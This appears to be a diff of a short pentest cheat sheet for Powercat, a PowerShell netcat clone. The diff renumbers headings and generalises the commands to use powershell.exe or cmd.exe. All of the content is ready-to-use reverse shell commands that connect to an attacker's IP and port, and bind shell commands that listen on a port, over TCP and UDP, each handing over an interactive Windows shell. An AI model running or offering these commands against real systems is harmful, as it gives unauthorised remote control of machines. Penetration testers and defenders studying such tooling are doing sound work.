@@ -1,24 +1,24 @@
 # Powercat
 
-## Reverse shell
+## 01 - Reverse shell
 
-### TCP Method
+### 1.1 - TCP Method
 
-`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe`
+`PS C:\> powercat -c <IP> -p <PORT> -e <powershell.exe | cmd.exe>`
 
-### UDP Method
+### 1.2 - UDP Method
 
-`PS C:\> powercat -u -c <IP> -p <PORT> -e cmd.exe`
+`PS C:\> powercat -u -c <IP> -p <PORT> -e <powershell.exe | cmd.exe>`
 
-## Bind shell
+## 02 - Bind shell
 
-### TCP Method
+### 2.1 - TCP Method
 
-`PS C:\> powercat -l -p <PORT> -e cmd.exe`
+`PS C:\> powercat -l -p <PORT> -e <powershell.exe | cmd.exe>`
 
-### UDP Method
+### 2.2 - UDP Method
 
-`PS C:\> powercat -u -l -p <PORT> -e cmd.exe`
+`PS C:\> powercat -u -l -p <PORT> -e <powershell.exe | cmd.exe>`
 
 ---
 ## References
